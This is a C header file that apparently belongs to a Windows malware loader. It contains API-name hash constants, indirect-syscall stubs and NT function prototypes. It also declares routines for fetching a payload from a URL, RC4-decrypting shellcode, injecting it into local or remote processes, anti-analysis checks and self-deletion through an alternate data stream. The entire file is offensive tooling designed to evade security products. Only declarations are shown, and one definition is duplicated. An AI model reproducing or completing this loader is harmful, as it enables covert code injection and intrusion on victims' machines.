#pragma once


#include <windows.h>
#include <stdio.h>


#include "Structs.h"
#include "Common.h"
#include "typedef.h"
#include "Debug.h"


#define HINT_BYTE 0x8C
#define KEY_SIZE 16

#define NEW_STREAM L":CAPY"







/*-------------[String Hash]-------------*/


#define NtQuerySystemInformation_DJB2   0x7B9816D6
#define NtAllocateVirtualMemory_DJB2    0x6E8AC28E
#define NtWriteVirtualMemory_DJB2       0x319F525A
#define NtClose_DJB2                    0x369BD981
#define NtCreateThreadEx_DJB2           0x8EC0B84A
#define NtWaitForSingleObject_DJB2      0x6299AD3D
#define NtOpenProcess_DJB2              0x837FAFFE
#define SystemFunction032_DJB2             0x8CFD40A8
#define NtProtectVirtualMemory_DJB2     0x1DA5BB2B

#define GetModuleFileNameW_JOAA         0xAB3A6AA1
#define CreateFileW_JOAA        0xADD132CA
#define SetFileInformationByHandle_JOAA         0x6DF54277
#define SetFileInformationByHandle_JOAA         0x6DF54277

#define CallNextHookEx_JOAA     0xB8B1ADC1
#define SetWindowsHookExW_JOAA 0x15580F7F
#define UnhookWindowsHookEx_JOAA        0x9D2856D0
#define NtDelayExecution_JOAA   0xB947891A
#define GetTickCount64_DJB2     0x00BB616E

#define NTDLLDLL_DJB2                   0x0141C4EE            
#define KERNEL32DLL_JOAA				0xFD2AD9BD

#define OpenProcess_JOAA				0xAF03507E




/*-------------[IatCamo]-------------*/

VOID IatCamouflage();
int RandomCompileTimeSeed(void);

/*-------------[HASHING]-------------*/

#define INITIAL_SEED 8   



UINT32 HashStringJenkinsOneAtATime32BitW(_In_ PWCHAR String);
UINT32 HashStringJenkinsOneAtATime32BitA(_In_ PCHAR String);


#define HASHA(API) (HashStringJenkinsOneAtATime32BitA((PCHAR) API))
#define HASHW(API) (HashStringJenkinsOneAtATime32BitW((PWCHAR) API))



/*-------------[MACROS]-------------*/

#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)


/*-------------[SSN/Syscall]-------------*/

DWORD NtAllocateVirtualMemorySSN;
DWORD NtCreateThreadSSN;
DWORD NtWriteVirtualMemorySSN;
DWORD NtWaitForSingleObjectSSN;
DWORD NtCloseSSN;
DWORD NtOpenProcessSSN;
DWORD NtQuerySystemInformationSSN;
DWORD NtDelayExecutionSSN;
DWORD NtProtectVirtualMemorySSN;

UINT_PTR NtAllocateVirtualMemorySyscall;
UINT_PTR NtCreateThreadSyscall;
UINT_PTR NtWriteVirtualMemorySyscall;
UINT_PTR NtWaitForSingleObjectSyscall;
UINT_PTR NtCloseSyscall;
UINT_PTR NtOpenProcessSyscall;
UINT_PTR NtQuerySystemInformationSyscall;
UINT_PTR NtDelayExecutionSyscall;
UINT_PTR NtProtectVirtualMemorySyscall;

/*-------------[FUNCTIONS]-------------*/

extern NTSTATUS NtDelayExecution(
    IN BOOL Alertable,
    IN PLARGE_INTEGER DelayInterval
);


extern NTSTATUS NtAllocateVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN ULONG ZeroBits,
    IN OUT PSIZE_T RegionSize,
    IN ULONG AllocationType,
    IN ULONG Protect);

extern NTSTATUS NtOpenProcess(
    OUT PHANDLE ProcessHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes,
    IN PCLIENT_ID ClientId OPTIONAL);

extern NTSTATUS NtCreateThreadEx(
    OUT PHANDLE ThreadHandle,
    IN ACCESS_MASK DesiredAccess,
    IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
    IN HANDLE ProcessHandle,
    IN PVOID StartRoutine,
    IN PVOID Argument OPTIONAL,
    IN ULONG CreateFlags,
    IN SIZE_T ZeroBits,
    IN SIZE_T StackSize,
    IN SIZE_T MaximumStackSize,
    IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);

extern NTSTATUS NtWriteVirtualMemory(
    IN HANDLE ProcessHandle,
    IN PVOID BaseAddress,
    IN PVOID Buffer,
    IN SIZE_T NumberOfBytesToWrite,
    OUT PSIZE_T NumberOfBytesWritten OPTIONAL);

extern NTSTATUS NtWaitForSingleObject(
    _In_ HANDLE Handle,
    _In_ BOOLEAN Alertable,
    _In_opt_ PLARGE_INTEGER Timeout);

extern NTSTATUS NtClose(
    IN HANDLE Handle);


extern NTSTATUS NtQuerySystemInformation(
    SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID                    SystemInformation,
    ULONG                    SystemInformationLength,
    PULONG                   ReturnLength
);

extern NTSTATUS NtProtectVirtualMemory(
    IN HANDLE ProcessHandle,
    IN OUT PVOID* BaseAddress,
    IN OUT PULONG NumberOfBytesToProtect,
    IN ULONG NewAccessProtection,
    OUT PULONG OldAccessProtection
);

/*-------------[WINAPI ADDRESSES]-------------*/



// structure that will be used to save the WinAPIs addresses
typedef struct _API_HASHING {
    
    fnGetTickCount64				pGetTickCount64;
    fnOpenProcess					pOpenProcess;
    fnCallNextHookEx				pCallNextHookEx;
    fnSetWindowsHookExW				pSetWindowsHookExW;
    fnGetMessageW					pGetMessageW;
    fnDefWindowProcW				pDefWindowProcW;
    fnUnhookWindowsHookEx			pUnhookWindowsHookEx;
    fnGetModuleFileNameW			pGetModuleFileNameW;
    fnCreateFileW					pCreateFileW;
    fnSetFileInformationByHandle	pSetFileInformationByHandle;
    fnCloseHandle					pCloseHandle;

}API_HASHING, * PAPI_HASHING;



/*-------------[Prototypes]-------------*/


BOOL AntiAnalysis();

BOOL GetPayloadFromUrl(LPCWSTR szUrl, PBYTE* pPayloadBytes, SIZE_T* sPayloadSize);

HMODULE GetMod(DWORD modName);
VOID indirectMyAss(IN DWORD funcName, IN HMODULE hNTDLL, OUT DWORD* SSN, OUT UINT_PTR* Syscall);

BOOL LocalInjection(IN HANDLE hProcess, IN PBYTE pShellcode, IN SIZE_T sShellcodeSize);
BOOL injectMyAss(IN HANDLE hProcess, IN DWORD PID, IN PBYTE pShellcode, IN SIZE_T sShellcodeSize);
BOOL GetRemoteProcessHandle(IN LPCWSTR szProcName, IN DWORD* pdwPid, IN HANDLE* phProcess);

BOOL CheckDebugger(void);
BOOL Vanish();

HMODULE GetModuleHandleH(DWORD dwModuleNameHash);
FARPROC GetProcAddressH(HMODULE hModule, DWORD dwApiNameHash);


PVOID _memcpy(PVOID Destination, PVOID Source, SIZE_T Size);
CHAR _toUpper(CHAR C);

BOOL Rc4EncryptionViSystemFunc032(IN PBYTE pRc4Key, IN PBYTE pPayloadData, IN DWORD dwRc4KeySize, IN DWORD sPayloadSize);

/*-------------[COPYSTUFF]-------------*/

